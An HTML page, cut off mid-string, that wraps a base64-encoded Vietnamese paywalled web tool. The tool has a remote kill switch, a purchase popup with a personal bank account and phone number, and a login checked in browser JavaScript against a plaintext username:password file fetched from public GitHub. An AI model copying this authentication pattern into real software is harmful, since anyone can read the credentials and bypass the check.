<!-- 

///////////////////////////////////////////////
/////Code được viết bởi Chauhuynh0104/////////
////http://fb.com/chauhuynh0104//////////////
/////////////079.567.9350///////////////////
///Vui lòng tôn trọng bản quyền tác giả////
/////////Không xoá dòng này //////////////
/////////////////////////////////////////

!-->
<!DOCTYPE html>
<html lang="vi">
<head><meta charset="UTF-8"><title>Thủ Thuật</title></head>
<body>
<script>
  const base64 = "PCEtLSANCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KLy8vLy8vLy8vLy8vLy9Db2RlIMSRxrDhu6NjIHZp4bq/dCBi4bufaSBDaGF1aHV5bmgwMTA0Ly8vLy8vLy8vLy8vLy8vLw0KLy8vLy8vLy8vLy8vL2h0dHA6Ly9mYi5jb20vY2hhdWh1eW5oMDEwNC8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLzA3OS41NjcuOTM1MC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQovLy8vLy8vLy8vLy9WdWkgbMOybmcgdMO0biB0cuG7jW5nIGLhuqNuIHF1eeG7gW4gdMOhYyBnaeG6oy8vLy8vLy8vLy8vDQovLy8vLy8vLy8vLy8vLy8vLy9LaMO0bmcgeG/DoSBkw7JuZyBuw6B5IC8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQovLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KIS0tPg0KPCFET0NUWVBFIGh0bWw+DQoNCjxodG1sIGxhbmc9InZpIj4NCjxoZWFkPg0KPGxpbmsgaHJlZj0iaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3MyP2ZhbWlseT1JbnRlcjp3Z2h0QDQwMDs2MDA7NzAwJmFtcDtkaXNwbGF5PXN3YXAiIHJlbD0ic3R5bGVzaGVldCIvPg0KPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvZm9udC1hd2Vzb21lLzYuNC4wL2Nzcy9hbGwubWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ii8+DQo8bWV0YSBjaGFyc2V0PSJ1dGYtOCIvPg0KPG1ldGEgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCIgbmFtZT0idmlld3BvcnQiLz4NCjx0aXRsZT5LaeG7g20gVHJhIFRo4bunIFRodeG6rXQ8L3RpdGxlPg0KPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2NoYXVodXluaDAxMDQuZ2l0aHViLmlvL2d5bS9naWFvZGllbi5jc3MiPg0KPCEtLSBFbWFpbEpTIFNESyAtLT4NCjxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL0BlbWFpbGpzL2Jyb3dzZXJANC9kaXN0L2VtYWlsLm1pbi5qcyI+PC9zY3JpcHQ+DQo8c2NyaXB0Pg0KICAoZnVuY3Rpb24oKXsNCiAgICBlbWFpbGpzLmluaXQoIi1ZRkZtSEpQOXpVSmFucXVLIik7IC8vIPCfkYggdGhheSBi4bqxbmcgUHVibGljIEtleSBj4bunYSBi4bqhbg0KICB9KSgpOw0KPC9zY3JpcHQ+DQo8c2NyaXB0Pg0KICAgIGFzeW5jIGZ1bmN0aW9uIGNoZWNrQWNjZXNzKCkgew0KICAgICAgICBjb25zdCBqc29uVXJsID0gJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jaGF1aHV5bmgwMTA0L2NoYXVodXluaDAxMDQudHh0L3JlZnMvaGVhZHMvbWFpbi9kcmNoYXUuanNvbic7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBjb25zdCByZXMgPSBhd2FpdCBmZXRjaChqc29uVXJsKTsNCiAgICAgICAgICAgIGlmICghcmVzLm9rKSB0aHJvdyBuZXcgRXJyb3IoJ0tow7RuZyB0aOG7gyB04bqjaSBmaWxlIEpTT04nKTsNCiAgICAgICAgICAgIGNvbnN0IGNvbmZpZyA9IGF3YWl0IHJlcy5qc29uKCk7DQoNCiAgICAgICAgICAgIGlmICghY29uZmlnLkFDQ0VTU19BTExPV0VEKSB7DQogICAgICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSBgPGRpdiBzdHlsZT0icGFkZGluZzo1MHB4O3RleHQtYWxpZ246Y2VudGVyO2NvbG9yOnJlZDtmb250LXNpemU6MjBweCI+DQogICAgICAgICAgICAgICAgICAgIDxoMj5C4bqiTyBUUsOMIEjhu4YgVEjhu5BORzwvaDI+DQogICAgICAgICAgICAgICAgICAgIDxwPiR7Y29uZmlnLk1FU1NBR0V9PC9wPg0KICAgICAgICAgICAgICAgICAgICAke2NvbmZpZy5SRURJUkVDVF9VUkwgPyBgPHA+U+G6vSBjaHV54buDbiBoxrDhu5tuZyBzYXUgPHNwYW4gaWQ9J2NvdW50ZG93bic+NTwvc3Bhbj4gZ2nDonkuLi48L3A+YCA6ICcnfQ0KICAgICAgICAgICAgICAgIDwvZGl2PmA7DQogICAgICAgICAgICAgICAgaWYgKGNvbmZpZy5SRURJUkVDVF9VUkwpIHsNCiAgICAgICAgICAgICAgICAgICAgbGV0IHNlY29uZHMgPSA1Ow0KICAgICAgICAgICAgICAgICAgICBjb25zdCB0aW1lciA9IHNldEludGVydmFsKCgpID0+IHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlY29uZHMtLTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjb3VudGRvd24nKS5pbm5lclRleHQgPSBzZWNvbmRzOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHNlY29uZHMgPD0gMCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwodGltZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy5sb2NhdGlvbi5ocmVmID0gY29uZmlnLlJFRElSRUNUX1VSTDsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfSwgMTAwMCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICB9IGNhdGNoIChlcnIpIHsNCiAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuaW5uZXJIVE1MID0gYDxkaXYgc3R5bGU9J3BhZGRpbmc6NTBweDt0ZXh0LWFsaWduOmNlbnRlcjtjb2xvcjpyZWQnPg0KICAgICAgICAgICAgICAgIDxoMj5LSMOUTkcgVOG6okkgxJDGr+G7okMgQ+G6pFUgSMOMTkg8L2gyPjxwPkzhu5dpIHRydXkgY+G6rXAga2hpIGvhur90IG7hu5FpIG3huqFuZy48YnIvPiBWdWkgbMOybmcga2nhu4NtIHRyYSBs4bqhaSDEkcaw4budbmcgdHJ1eeG7gW4gaW50ZXJuZXQuPC9wPg0KICAgICAgICAgICAgPC9kaXY+YDsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIGFzeW5jIGZ1bmN0aW9uIGxvYWRBY2NvdW50c0Zyb21UWFQoKSB7DQogICAgICAgIGNvbnN0IHR4dFVybCA9ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2hhdWh1eW5oMDEwNC9jaGF1aHV5bmgwMTA0LnR4dC9yZWZzL2hlYWRzL21haW4vdGtrLnR4dCc7DQogICAgICAgIGNvbnN0IHJlcyA9IGF3YWl0IGZldGNoKHR4dFVybCk7DQogICAgICAgIGNvbnN0IHRleHQgPSBhd2FpdCByZXMudGV4dCgpOw0KICAgICAgICBjb25zdCBhY2NvdW50cyA9IHt9Ow0KICAgICAgICB0ZXh0LnNwbGl0KCdcbicpLmZvckVhY2gobGluZSA9PiB7DQogICAgICAgICAgICBjb25zdCBbdSwgcF0gPSBsaW5lLnRyaW0oKS5zcGxpdCgnOicpOw0KICAgICAgICAgICAgaWYgKHUgJiYgcCkgYWNjb3VudHNbdV0gPSBwOw0KICAgICAgICB9KTsNCiAgICAgICAgcmV0dXJuIGFjY291bnRzOw0KICAgIH0NCg0KICAgIGFzeW5jIGZ1bmN0aW9uIGVuYWJsZUxvZ2luKGFjY291bnRzKSB7DQogICAgICAgIGNvbnN0IGJ0biA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbkJ0bicpOw0KICAgICAgICBjb25zdCB1c2VySW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndXNlcm5hbWVJbnB1dCcpOw0KICAgICAgICBjb25zdCBwYXNzSW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGFzc3dvcmRJbnB1dCcpOw0KICAgICAgICBjb25zdCBlcnJvckRpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbkVycm9yJyk7DQoNCiAgICAgICAgYnRuLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4gew0KICAgICAgICAgICAgY29uc3QgdXNlciA9IHVzZXJJbnB1dC52YWx1ZS50cmltKCk7DQogICAgICAgICAgICBjb25zdCBwYXNzID0gcGFzc0lucHV0LnZhbHVlLnRyaW0oKTsNCiAgICAgICAgICAgIGlmIChhY2NvdW50c1t1c2VyXSAmJiBhY2NvdW50c1t1c2VyXSA9PT0gcGFzcykgew0KICAgICAgICAgICAgICAgIHNlc3Npb25TdG9yYWdlLnNldEl0ZW0oJ21lZFVzZXInLCB1c2VyKTsNCiAgICAgICAgICAgICAgICBkb2N1bWVudC5ib2R5LmNsYXNzTGlzdC5yZW1vdmUoJ2xvZ2luLXBhZ2UnKTsNCiAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5TZWN0aW9uJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFpbkNvbnRlbnQnKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgICAgICAgICAgICBlcnJvckRpdi5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICBlcnJvckRpdi5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSk7DQogICAgfQ0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsIGZ1bmN0aW9uKCkgew0KICAvLyBHw6FuIHPhu7Ega2nhu4duIGNobyBkcm9wZG93biBs4buNYyBtw6F5DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21hY2hpbmVPcGVyYXRvclNlbGVjdCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZpbHRlck1hY2hpbmVFcnJvcnNCeU9wZXJhdG9yKTsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFjaGluZUNvbmZsaWN0T3BlcmF0b3JTZWxlY3QnKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmaWx0ZXJNYWNoaW5lQ29uZmxpY3RzQnlPcGVyYXRvcik7DQoJIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtaXNzaW5nTWFjaGluZU9wZXJhdG9yU2VsZWN0JykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZmlsdGVyTWlzc2luZ01hY2hpbmVCeU9wZXJhdG9yKTsNCg0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dNb3JlU3VnZ2VzdGlvbnNDaGVja2JveCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uKCkgew0KICAgIGlmIChhbGxQcm9jZWR1cmVzLmxlbmd0aCA+IDApIHsNCiAgICAgICAgZ2VuZXJhdGVUaW1lU3VnZ2VzdGlvbnMoYWxsUHJvY2VkdXJlcyk7DQogICAgICAgIGZpbHRlckJ5T3BlcmF0b3IoKTsNCiAgICB9DQp9KTsNCn0pOw0KDQogd2luZG93LmFkZEV2ZW50TGlzdGVuZXIoJ0RPTUNvbnRlbnRMb2FkZWQnLCBhc3luYyAoKSA9PiB7DQogIGNvbnN0IGFsbG93ID0gYXdhaXQgY2hlY2tBY2Nlc3MoKTsNCiAgaWYgKCFhbGxvdykgcmV0dXJuOw0KICAvLyBDaOG7iSBraeG7g20gdHJhIMSRxINuZyBuaOG6rXAgxJHDoyBsxrB1OyBLSMOUTkcgdOG6o2kgcnVsZS9wcm9jZWR1cmVzIOG7nyDEkcOieQ0KICBjaGVja1NhdmVkTG9naW4oKTsNCn0pOw0KDQo8L3NjcmlwdD4NCg0KDQoNCg0KPC9oZWFkPg0KPGJvZHk+DQoNCjwhLS0gVEhFTUUgUElDS0VSIC0tPg0KPGRpdiBpZD0idGhlbWVQaWNrZXIiIGNsYXNzPSJ0aGVtZS1waWNrZXIiIHRpdGxlPSJDaOG7jW4gbcOgdSBjaOG7pyDEkeG7gSBnaWFvIGRp4buHbiI+DQogDQogDQogIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0idGhlbWUtc3dhdGNoIiBkYXRhLXRoZW1lPSJkZWZhdWx0IiBzdHlsZT0iLS1zd2F0Y2g6IzM0OThkYiIgYXJpYS1sYWJlbD0iTeG6t2MgxJHhu4tuaCAoWGFuaCBkxrDGoW5nKSI+PC9idXR0b24+DQogIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0idGhlbWUtc3dhdGNoIiBkYXRhLXRoZW1lPSJvcmFuZ2UiICBzdHlsZT0iLS1zd2F0Y2g6I0ZGNjYwMCIgYXJpYS1sYWJlbD0iTcOgdSBjYW0iPjwvYnV0dG9uPg0KICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9InRoZW1lLXN3YXRjaCIgZGF0YS10aGVtZT0icmVkIiAgICAgc3R5bGU9Ii0tc3dhdGNoOiNGRjAwMDAiIGFyaWEtbGFiZWw9Ik3DoHUgxJHhu48iPjwvYnV0dG9uPg0KICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9InRoZW1lLXN3YXRjaCIgZGF0YS10aGVtZT0iZ3JlZW4iICAgc3R5bGU9Ii0tc3dhdGNoOiMwMEFBMDAiIGFyaWEtbGFiZWw9Ik3DoHUgeGFuaCBsw6EiPjwvYnV0dG9uPg0KICAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGlkPSJkYXJrVG9nZ2xlIiBjbGFzcz0idGhlbWUtZGFyay10b2dnbGUiIG9uY2xpY2s9InRvZ2dsZURhcmtNb2RlKCkiIGFyaWEtbGFiZWw9IkLhuq10L1Thuq90IGNo4bq/IMSR4buZIHThu5FpIj4NCiAgICA8c3BhbiBpZD0iZGFya0ljb24iPjxzbWFsbD7wn4yZPC9zbWFsbD48L3NwYW4+IDxzcGFuIGlkPSJkYXJrVGV4dCI+VOG7kWk8L3NwYW4+DQogIDwvYnV0dG9uPg0KICANCjwvZGl2Pg0KDQoNCg0KDQo8c2NyaXB0Pg0KICAgICAgZnVuY3Rpb24gdG9nZ2xlRGFya01vZGUoKSB7DQogICAgICAgIGNvbnN0IGJvZHkgPSBkb2N1bWVudC5ib2R5Ow0KICAgICAgICBjb25zdCBpY29uID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImRhcmtJY29uIik7DQogICAgICAgIGNvbnN0IHRleHQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZGFya1RleHQiKTsNCiAgICAgICAgYm9keS5jbGFzc0xpc3QudG9nZ2xlKCJkYXJrLW1vZGUiKTsNCiAgICAgICAgY29uc3QgaXNEYXJrID0gYm9keS5jbGFzc0xpc3QuY29udGFpbnMoImRhcmstbW9kZSIpOw0KICAgICAgICBpY29uLnRleHRDb250ZW50ID0gaXNEYXJrID8gIuKYgO+4jyIgOiAi8J+MmSI7DQogICAgICAgIHRleHQudGV4dENvbnRlbnQgPSBpc0RhcmsgPyAiU8OhbmciIDogIlThu5FpIjsNCiAgICAgIH0NCiAgICA8L3NjcmlwdD4NCjxzY3JpcHQ+DQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgKCkgPT4gew0KLy8gTOG6pXkgY8OhYyBwaOG6p24gdOG7rQ0KICAgICAgICAgICAgY29uc3QgdHJpZ2dlckJ1dHRvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0cmlnZ2VyQnV0dG9uJyk7DQogICAgICAgICAgICBjb25zdCBmaWxlSW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZUlucHV0Jyk7DQoNCiAgICAgICAgICAgIC8vIEtp4buDbSB0cmEgeGVtIHBo4bqnbiB04butIGPDsyB04buTbiB04bqhaSBraMO0bmcNCiAgICAgICAgICAgIGlmICghdHJpZ2dlckJ1dHRvbiB8fCAhZmlsZUlucHV0KSB7DQogICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcignTOG7l2k6IEtow7RuZyB0w6xtIHRo4bqleSB0cmlnZ2VyQnV0dG9uIGhv4bq3YyBmaWxlSW5wdXQnKTsNCiAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC8vIFRow6ptIHPhu7Ega2nhu4duIGNsaWNrIGNobyBidXR0b24NCiAgICAgICAgICAgIHRyaWdnZXJCdXR0b24uYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKSA9PiB7DQogICAgICAgICAgICAgICAgZmlsZUlucHV0LmNsaWNrKCk7IC8vIEvDrWNoIGhv4bqhdCBpbnB1dCBmaWxlDQogICAgICAgICAgICB9KTsNCg0KICAgICAgICB9KTsNCg0KPC9zY3JpcHQ+DQoNCg0KDQoNCg0KPCEtLSBQT1BVUCBNVUEgQuG6ok4gUVVZ4buATiAtLT4NCjxkaXYgaWQ9ImJ1eVBvcHVwIiBjbGFzcz0icG9wdXAtb3ZlcmxheSIgc3R5bGU9ImRpc3BsYXk6bm9uZTsiPg0KICA8ZGl2IGNsYXNzPSJwb3B1cC1jb250ZW50IGx1eHVyeSI+DQogICAgPGgyIGNsYXNzPSJwb3B1cC10aXRsZSI+QuG6ok5HIEdJw4EgQuG6ok4gUVVZ4buATjwvaDI+DQogICAgPGRpdiBjbGFzcz0icHJpY2luZy1ncmlkIj4NCiAgICAgIDxkaXYgY2xhc3M9InByaWNlLWNhcmQiPg0KICAgICAgICA8aDM+MSBUaMOhbmc8L2gzPg0KICAgICAgICA8cCBjbGFzcz0icHJpY2UiPjEuMDAwLjAwMCBWTsSQPC9wPg0KICAgICAgICA8YnV0dG9uIGNsYXNzPSJidXktYnRuIiBvbmNsaWNrPSJvcGVuUGF5bWVudCgnMSBUaMOhbmcnLCAnMS4wMDAuMDAwIFZOxJAnKSI+TXVhIG5nYXk8L2J1dHRvbj4NCiAgICAgIDwvZGl2Pg0KICAgICAgPGRpdiBjbGFzcz0icHJpY2UtY2FyZCI+DQogICAgICAgIDxoMz42IFRow6FuZzwvaDM+DQogICAgICAgIDxwIGNsYXNzPSJwcmljZSI+NS4wMDAuMDAwIFZOxJA8L3A+DQogICAgICAgIDxidXR0b24gY2xhc3M9ImJ1eS1idG4iIG9uY2xpY2s9Im9wZW5QYXltZW50KCc2IFRow6FuZycsICc1LjAwMC4wMDAgVk7EkCcpIj5NdWEgbmdheTwvYnV0dG9uPg0KICAgICAgPC9kaXY+DQogICAgICA8ZGl2IGNsYXNzPSJwcmljZS1jYXJkIj4NCiAgICAgICAgPGgzPjEgTsSDbTwvaDM+DQogICAgICAgIDxwIGNsYXNzPSJwcmljZSI+MTAuMDAwLjAwMCBWTsSQPC9wPg0KICAgICAgICA8YnV0dG9uIGNsYXNzPSJidXktYnRuIiBvbmNsaWNrPSJvcGVuUGF5bWVudCgnMSBOxINtJywgJzEwLjAwMC4wMDAgVk7EkCcpIj5NdWEgbmdheTwvYnV0dG9uPg0KICAgICAgPC9kaXY+DQogICAgICA8ZGl2IGNsYXNzPSJwcmljZS1jYXJkIj4NCiAgICAgICAgPGgzPjUgTsSDbTwvaDM+DQogICAgICAgIDxwIGNsYXNzPSJwcmljZSI+NDAuMDAwLjAwMCBWTsSQPC9wPg0KICAgICAgICA8YnV0dG9uIGNsYXNzPSJidXktYnRuIiBvbmNsaWNrPSJvcGVuUGF5bWVudCgnNSBOxINtJywgJzQwLjAwMC4wMDAgVk7EkCcpIj5NdWEgbmdheTwvYnV0dG9uPg0KICAgICAgPC9kaXY+DQogICAgPC9kaXY+DQogICAgPGJ1dHRvbiBjbGFzcz0iY2xvc2UtYnRuIiBvbmNsaWNrPSJjbG9zZUJ1eVBvcHVwKCkiPsSQw7NuZzwvYnV0dG9uPg0KICA8L2Rpdj4NCjwvZGl2Pg0KDQo8IS0tIFBPUFVQIFRIQU5IIFRPw4FOIC0tPg0KPGRpdiBpZD0icGF5bWVudFBvcHVwIiBjbGFzcz0icG9wdXAtb3ZlcmxheSIgc3R5bGU9ImRpc3BsYXk6bm9uZTsiPg0KICA8ZGl2IGNsYXNzPSJwb3B1cC1jb250ZW50IGZvcm0tcG9wdXAiPg0KICAgIDxoMj5Yw4FDIE5I4bqsTiBUSEFOSCBUT8OBTjwvaDI+PGJyLz4NCgk8bGFiZWw+PGZvbnQgY29sb3I9InJlZCI+PGI+VnVpIGzDsm5nIHRoYW5oIHRvw6FuIHRyxrDhu5tjIHbDoCDEkeG7o2kgYuG7mSBwaOG6rW4ga+G7uSB0aHXhuq10IGxpw6puIGjhu4c8L2I+PC9mb250PjwvbGFiZWw+PGJyLz48YnIvPg0KICAgIDxmb3JtIGlkPSJwYXltZW50Rm9ybSI+DQogICAgICA8bGFiZWw+U+G7kSB0w6BpIGtob+G6o24gdGjhu6UgaMaw4bufbmc6IDxiPjE3OTU2NzkzNTA8L2I+PC9sYWJlbD48YnIvPg0KCSAgIDxsYWJlbD5Uw6puIHTDoGkga2hv4bqjbjogPGI+SHXhu7NuaCBOZ+G7jWMgQ2jDonU8L2I+PC9sYWJlbD48YnIvPg0KICAgICAgPGxhYmVsPk5nw6JuIGjDoG5nOiA8Yj5WaWV0Y29tYmFuazwvYj48L2xhYmVsPjxici8+PGJyLz4NCiAgICAgIDxsYWJlbD5T4buRIHRp4buBbiBj4bqnbiB0aGFuaCB0b8Ohbjo8L2xhYmVsPg0KICAgICAgPGlucHV0IHR5cGU9InRleHQiIGlkPSJtb25leSIgcmVhZG9ubHk+PGJyLz4NCiAgICAgPGxhYmVsPlPhu5EgdMOgaSBraG/huqNuIG5nxrDhu51pIG11YTo8L2xhYmVsPg0KPGlucHV0IHR5cGU9InRleHQiIGlkPSJidXllckFjYyIgcmVxdWlyZWQ+PGJyLz4NCg0KPGxhYmVsPk5nw6JuIGjDoG5nIG5nxrDhu51pIG11YTo8L2xhYmVsPg0KPHNlbGVjdCBpZD0iYnV5ZXJCYW5rIiByZXF1aXJlZD4NCiAgPG9wdGlvbiB2YWx1ZT0iIj4tLSBDaOG7jW4gbmfDom4gaMOgbmcgLS08L29wdGlvbj4NCiAgPG9wdGlvbj5BZ3JpYmFuayAtIE5nw6JuIGjDoG5nIE7DtG5nIG5naGnhu4dwICYgUFROVCBWaeG7h3QgTmFtPC9vcHRpb24+DQogIDxvcHRpb24+VmlldGNvbWJhbmsgLSBOZ8OibiBow6BuZyBUTUNQIE5nb+G6oWkgdGjGsMahbmcgVmnhu4d0IE5hbTwvb3B0aW9uPg0KICA8b3B0aW9uPlZpZXRpbkJhbmsgLSBOZ8OibiBow6BuZyBUTUNQIEPDtG5nIFRoxrDGoW5nIFZp4buHdCBOYW08L29wdGlvbj4NCiAgPG9wdGlvbj5CSURWIC0gTmfDom4gaMOgbmcgVE1DUCDEkOG6p3UgdMawIHbDoCBQaMOhdCB0cmnhu4NuIFZp4buHdCBOYW08L29wdGlvbj4NCiAgPG9wdGlvbj5BQ0IgLSBOZ8OibiBow6BuZyDDgSBDaMOidTwvb3B0aW9uPg0KICA8b3B0aW9uPlNhY29tYmFuayAtIE5nw6JuIGjDoG5nIFRNQ1AgU8OgaSBHw7JuIFRoxrDGoW5nIFTDrW48L29wdGlvbj4NCiAgPG9wdGlvbj5UZWNoY29tYmFuayAtIE5nw6JuIGjDoG5nIFRNQ1AgS+G7uSB0aMawxqFuZyBWaeG7h3QgTmFtPC9vcHRpb24+DQogIDxvcHRpb24+TUJCYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBRdcOibiDEkeG7mWk8L29wdGlvbj4NCiAgPG9wdGlvbj5UUEJhbmsgLSBOZ8OibiBow6BuZyBUTUNQIFRpw6puIFBob25nPC9vcHRpb24+DQogIDxvcHRpb24+VlBCYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBWaeG7h3QgTmFtIFRo4buLbmggVsaw4bujbmc8L29wdGlvbj4NCiAgPG9wdGlvbj5IREJhbmsgLSBOZ8OibiBow6BuZyBUTUNQIFBow6F0IHRyaeG7g24gVFAgSOG7kyBDaMOtIE1pbmg8L29wdGlvbj4NCiAgPG9wdGlvbj5FeGltYmFuayAtIE5nw6JuIGjDoG5nIFRNQ1AgWHXhuqV0IE5o4bqtcCBraOG6qXUgVmnhu4d0IE5hbTwvb3B0aW9uPg0KICA8b3B0aW9uPlNIQiAtIE5nw6JuIGjDoG5nIFRNQ1AgU8OgaSBHw7JuIC0gSMOgIE7hu5lpPC9vcHRpb24+DQogIDxvcHRpb24+U2VBQmFuayAtIE5nw6JuIGjDoG5nIFRNQ1AgxJDDtG5nIE5hbSDDgTwvb3B0aW9uPg0KICA8b3B0aW9uPlNDQiAtIE5nw6JuIGjDoG5nIFRNQ1AgU8OgaSBHw7JuPC9vcHRpb24+DQogIDxvcHRpb24+T0NCIC0gTmfDom4gaMOgbmcgVE1DUCBQaMawxqFuZyDEkMO0bmc8L29wdGlvbj4NCiAgPG9wdGlvbj5WSUIgLSBOZ8OibiBow6BuZyBUTUNQIFF14buRYyB04bq/IFZp4buHdCBOYW08L29wdGlvbj4NCiAgPG9wdGlvbj5QVmNvbUJhbmsgLSBOZ8OibiBow6BuZyBUTUNQIMSQ4bqhaSBDaMO6bmcgVmnhu4d0IE5hbTwvb3B0aW9uPg0KICA8b3B0aW9uPk5hbUFCYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBOYW0gw4E8L29wdGlvbj4NCiAgPG9wdGlvbj5PY2VhbkJhbmsgLSBOZ8OibiBow6BuZyBUTSBUTkhIIE1UViDEkOG6oWkgRMawxqFuZzwvb3B0aW9uPg0KICA8b3B0aW9uPkJhY0FCYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBC4bqvYyDDgTwvb3B0aW9uPg0KICA8b3B0aW9uPkFCQkFOSyAtIE5nw6JuIGjDoG5nIFRNQ1AgQW4gQsOsbmg8L29wdGlvbj4NCiAgPG9wdGlvbj5C4bqjbyBWaeG7h3QgQmFuayAtIE5nw6JuIGjDoG5nIFRNQ1AgQuG6o28gVmnhu4d0PC9vcHRpb24+DQogIDxvcHRpb24+S2nDqm4gTG9uZyBCYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBLacOqbiBMb25nPC9vcHRpb24+DQogIDxvcHRpb24+VmlldENhcGl0YWxCYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBC4bqjbiBWaeG7h3Q8L29wdGlvbj4NCiAgPG9wdGlvbj5OQ0IgLSBOZ8OibiBow6BuZyBUTUNQIFF14buRYyBEw6JuPC9vcHRpb24+DQogIDxvcHRpb24+TFBCYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBCxrB1IMSRaeG7h24gTGnDqm4gVmnhu4d0PC9vcHRpb24+DQogIDxvcHRpb24+UEcgQmFuayAtIE5nw6JuIGjDoG5nIFRNQ1AgWMSDbmcgZOG6p3UgUGV0cm9saW1leDwvb3B0aW9uPg0KICA8b3B0aW9uPlZpZXRCYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBWaeG7h3QgTmFtIFRoxrDGoW5nIFTDrW48L29wdGlvbj4NCiAgPG9wdGlvbj5TYWlnb25CYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBTw6BpIEfDsm4gQ8O0bmcgVGjGsMahbmc8L29wdGlvbj4NCiAgPG9wdGlvbj5DTy1PUCBCYW5rIC0gTmfDom4gaMOgbmcgSOG7o3AgdMOhYyB4w6MgVmnhu4d0IE5hbTwvb3B0aW9uPg0KICA8b3B0aW9uPlB1YmxpYyBCYW5rIFZpZXRuYW08L29wdGlvbj4NCiAgPG9wdGlvbj5TaGluaGFuIEJhbmsgVmlldG5hbTwvb3B0aW9uPg0KICA8b3B0aW9uPldvb3JpIEJhbmsgVmlldG5hbT